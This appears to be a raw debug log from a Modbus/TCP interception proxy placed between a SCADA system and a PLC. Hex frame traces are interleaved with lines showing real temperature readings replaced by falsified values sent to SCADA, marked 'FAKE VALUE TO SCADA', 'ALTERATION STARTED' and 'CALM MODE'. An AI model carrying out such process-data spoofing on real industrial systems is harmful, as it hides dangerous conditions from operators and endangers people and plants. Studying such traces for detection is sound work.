2025-12-25 16:07:32,913 DEBUG logging:103 SEND: 0x0 0x31 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:32,913 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:07:32,913 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:07:32,915 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:07:32,915 DEBUG logging:103 RECV: 0x0 0x31 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1
2025-12-25 16:07:32,915 DEBUG logging:103 Processing: 0x0 0x31 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1
2025-12-25 16:07:32,915 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:07:32,915 DEBUG logging:103 Adding transaction 49
2025-12-25 16:07:32,915 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:32,915 DEBUG logging:103 Getting transaction 49
2025-12-25 16:07:32,915 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:07:32,915 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:32,916 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:07:32,916 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 582
[*] DELTA : -7.05
[*] Last value Reported to SCADA : 522.05
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 516.77
[*]==> FAKE VALUE TO SCADA: 516
2025-12-25 16:07:32,916 DEBUG logging:103 send: 0x0 0x31 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x45 0x2 0x4 0x0 0x1
2025-12-25 16:07:38,346 DEBUG logging:103 recv: 0x0 0x32 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1 old_data:  addr=None
2025-12-25 16:07:38,346 DEBUG logging:103 Handling data: 0x0 0x32 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:07:38,346 DEBUG logging:103 Processing: 0x0 0x32 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:07:38,346 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:07:38,346 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:07:38,346 DEBUG logging:103 Running transaction 50
2025-12-25 16:07:38,346 DEBUG logging:103 SEND: 0x0 0x32 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:07:38,347 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:07:38,347 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:07:38,348 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:07:38,348 DEBUG logging:103 RECV: 0x0 0x32 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:38,348 DEBUG logging:103 Processing: 0x0 0x32 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:38,348 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:07:38,348 DEBUG logging:103 Adding transaction 50
2025-12-25 16:07:38,348 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:38,348 DEBUG logging:103 Getting transaction 50
2025-12-25 16:07:38,348 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:07:38,348 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:38,349 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:07:38,349 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:07:38,349 DEBUG logging:103 send: 0x0 0x32 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:03,920 DEBUG logging:103 recv: 0x0 0x33 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:08:03,920 DEBUG logging:103 Handling data: 0x0 0x33 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:03,920 DEBUG logging:103 Processing: 0x0 0x33 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:03,920 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:08:03,920 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:08:03,920 DEBUG logging:103 Running transaction 51
2025-12-25 16:08:03,921 DEBUG logging:103 SEND: 0x0 0x33 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:03,921 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:08:03,921 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:08:03,922 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:08:03,922 DEBUG logging:103 RECV: 0x0 0x33 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:08:03,922 DEBUG logging:103 Processing: 0x0 0x33 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:08:03,922 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:08:03,922 DEBUG logging:103 Adding transaction 51
2025-12-25 16:08:03,923 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:03,923 DEBUG logging:103 Getting transaction 51
2025-12-25 16:08:03,923 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:08:03,923 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:03,923 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:08:03,923 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 836
[*] DELTA : -1.77
[*] Last value Reported to SCADA : 516.77
[*] ALTERATION STOPPED - TARGET VALUE REACHED
[*] RESTORATION
[*] Temp > THRESHOLD: 1fois
[*] IN CALM MODE
[*]==> FAKE VALUE TO SCADA: 836
2025-12-25 16:08:03,923 DEBUG logging:103 send: 0x0 0x33 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x3 0x44 0x0 0x1
2025-12-25 16:08:08,347 DEBUG logging:103 recv: 0x0 0x34 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0 old_data:  addr=None
2025-12-25 16:08:08,347 DEBUG logging:103 Handling data: 0x0 0x34 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:08,347 DEBUG logging:103 Processing: 0x0 0x34 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:08,348 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:08:08,348 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:08:08,348 DEBUG logging:103 Running transaction 52
2025-12-25 16:08:08,348 DEBUG logging:103 SEND: 0x0 0x34 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:08,348 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:08:08,348 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:08:08,349 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:08:08,349 DEBUG logging:103 RECV: 0x0 0x34 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:08,349 DEBUG logging:103 Processing: 0x0 0x34 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:08,349 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:08:08,349 DEBUG logging:103 Adding transaction 52
2025-12-25 16:08:08,349 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:08,349 DEBUG logging:103 Getting transaction 52
2025-12-25 16:08:08,349 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:08:08,349 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:08,350 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:08:08,350 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:08:08,350 DEBUG logging:103 send: 0x0 0x34 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:34,931 DEBUG logging:103 recv: 0x0 0x35 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:08:34,931 DEBUG logging:103 Handling data: 0x0 0x35 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:34,931 DEBUG logging:103 Processing: 0x0 0x35 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:34,931 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:08:34,931 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:08:34,931 DEBUG logging:103 Running transaction 53
2025-12-25 16:08:34,931 DEBUG logging:103 SEND: 0x0 0x35 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:08:34,931 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:08:34,931 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:08:34,933 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:08:34,933 DEBUG logging:103 RECV: 0x0 0x35 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:34,933 DEBUG logging:103 Processing: 0x0 0x35 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:34,933 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:08:34,933 DEBUG logging:103 Adding transaction 53
2025-12-25 16:08:34,933 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:34,933 DEBUG logging:103 Getting transaction 53
2025-12-25 16:08:34,933 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:08:34,933 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:34,934 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:08:34,934 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 730
2025-12-25 16:08:34,934 DEBUG logging:103 send: 0x0 0x35 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x21 0x2 0xda 0x0 0x0
2025-12-25 16:08:38,348 DEBUG logging:103 recv: 0x0 0x36 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1 old_data:  addr=None
2025-12-25 16:08:38,349 DEBUG logging:103 Handling data: 0x0 0x36 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:08:38,349 DEBUG logging:103 Processing: 0x0 0x36 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:08:38,349 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:08:38,349 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:08:38,349 DEBUG logging:103 Running transaction 54
2025-12-25 16:08:38,349 DEBUG logging:103 SEND: 0x0 0x36 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:08:38,349 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:08:38,349 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:08:38,350 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:08:38,350 DEBUG logging:103 RECV: 0x0 0x36 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:38,350 DEBUG logging:103 Processing: 0x0 0x36 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:08:38,350 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:08:38,350 DEBUG logging:103 Adding transaction 54
2025-12-25 16:08:38,350 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:38,350 DEBUG logging:103 Getting transaction 54
2025-12-25 16:08:38,350 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:08:38,350 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:08:38,351 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:08:38,351 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:08:38,351 DEBUG logging:103 send: 0x0 0x36 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:05,934 DEBUG logging:103 recv: 0x0 0x37 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:09:05,934 DEBUG logging:103 Handling data: 0x0 0x37 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:05,934 DEBUG logging:103 Processing: 0x0 0x37 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:05,934 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:09:05,934 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:09:05,934 DEBUG logging:103 Running transaction 55
2025-12-25 16:09:05,934 DEBUG logging:103 SEND: 0x0 0x37 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:05,934 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:09:05,935 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:09:05,936 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:09:05,936 DEBUG logging:103 RECV: 0x0 0x37 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:09:05,936 DEBUG logging:103 Processing: 0x0 0x37 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:09:05,936 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:09:05,937 DEBUG logging:103 Adding transaction 55
2025-12-25 16:09:05,937 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:05,937 DEBUG logging:103 Getting transaction 55
2025-12-25 16:09:05,937 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:09:05,937 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:05,937 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:09:05,937 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 739
2025-12-25 16:09:05,937 DEBUG logging:103 send: 0x0 0x37 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x43 0x2 0xe3 0x0 0x1
2025-12-25 16:09:08,348 DEBUG logging:103 recv: 0x0 0x38 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0 old_data:  addr=None
2025-12-25 16:09:08,348 DEBUG logging:103 Handling data: 0x0 0x38 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:08,348 DEBUG logging:103 Processing: 0x0 0x38 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:08,348 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:09:08,348 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:09:08,348 DEBUG logging:103 Running transaction 56
2025-12-25 16:09:08,348 DEBUG logging:103 SEND: 0x0 0x38 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:08,348 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:09:08,349 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:09:08,349 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:09:08,349 DEBUG logging:103 RECV: 0x0 0x38 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:08,349 DEBUG logging:103 Processing: 0x0 0x38 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:08,350 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:09:08,350 DEBUG logging:103 Adding transaction 56
2025-12-25 16:09:08,350 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:08,350 DEBUG logging:103 Getting transaction 56
2025-12-25 16:09:08,350 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:09:08,350 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:08,350 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:09:08,351 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:09:08,351 DEBUG logging:103 send: 0x0 0x38 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:36,963 DEBUG logging:103 recv: 0x0 0x39 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:09:36,963 DEBUG logging:103 Handling data: 0x0 0x39 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:36,963 DEBUG logging:103 Processing: 0x0 0x39 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:36,963 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:09:36,964 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:09:36,964 DEBUG logging:103 Running transaction 57
2025-12-25 16:09:36,964 DEBUG logging:103 SEND: 0x0 0x39 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:09:36,964 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:09:36,964 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:09:36,966 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:09:36,966 DEBUG logging:103 RECV: 0x0 0x39 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:36,966 DEBUG logging:103 Processing: 0x0 0x39 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:36,966 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:09:36,966 DEBUG logging:103 Adding transaction 57
2025-12-25 16:09:36,966 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:36,966 DEBUG logging:103 Getting transaction 57
2025-12-25 16:09:36,966 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:09:36,966 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:36,966 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:09:36,966 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 739
2025-12-25 16:09:36,966 DEBUG logging:103 send: 0x0 0x39 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0xe3 0x0 0x0
2025-12-25 16:09:38,385 DEBUG logging:103 recv: 0x0 0x3a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0 old_data:  addr=None
2025-12-25 16:09:38,385 DEBUG logging:103 Handling data: 0x0 0x3a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:09:38,385 DEBUG logging:103 Processing: 0x0 0x3a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:09:38,386 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:09:38,386 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:09:38,386 DEBUG logging:103 Running transaction 58
2025-12-25 16:09:38,386 DEBUG logging:103 SEND: 0x0 0x3a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:09:38,386 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:09:38,386 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:09:38,388 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:09:38,388 DEBUG logging:103 RECV: 0x0 0x3a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:38,388 DEBUG logging:103 Processing: 0x0 0x3a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:09:38,388 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:09:38,388 DEBUG logging:103 Adding transaction 58
2025-12-25 16:09:38,388 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:38,388 DEBUG logging:103 Getting transaction 58
2025-12-25 16:09:38,388 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:09:38,388 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:09:38,388 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:09:38,388 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:09:38,388 DEBUG logging:103 send: 0x0 0x3a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:10:07,972 DEBUG logging:103 recv: 0x0 0x3b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:10:07,972 DEBUG logging:103 Handling data: 0x0 0x3b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:10:07,972 DEBUG logging:103 Processing: 0x0 0x3b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:10:07,972 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:10:07,973 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:10:07,973 DEBUG logging:103 Running transaction 59
2025-12-25 16:10:07,973 DEBUG logging:103 SEND: 0x0 0x3b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:10:07,973 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:10:07,973 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:10:07,975 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:10:07,975 DEBUG logging:103 RECV: 0x0 0x3b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:10:07,975 DEBUG logging:103 Processing: 0x0 0x3b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:10:07,975 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:10:07,975 DEBUG logging:103 Adding transaction 59
2025-12-25 16:10:07,976 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:10:07,976 DEBUG logging:103 Getting transaction 59
2025-12-25 16:10:07,976 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:10:07,976 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:10:07,976 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:10:07,976 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 497
[*] CALM MODE FINISHED
2025-12-25 16:10:07,976 DEBUG logging:103 send: 0x0 0x3b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3a 0x1 0xf1 0x0 0x0
2025-12-25 16:10:08,385 DEBUG logging:103 recv: 0x0 0x3c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xc6 0x0 0x1 old_data:  addr=None
2025-12-25 16:10:08,385 DEBUG logging:103 Handling data: 0x0 0x3c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xc6 0x0 0x1
2025-12-25 16:10:08,385 DEBUG logging:103 Processing: 0x0 0x3c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xc6 0x0 0x1
2025-12-25 16:10:08,385 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:10:08,385 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:10:08,385 DEBUG logging:103 Running transaction 60
2025-12-25 16:10:08,386 DEBUG logging:103 SEND: 0x0 0x3c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xc6 0x0 0x1
2025-12-25 16:10:08,386 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:10:08,386 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
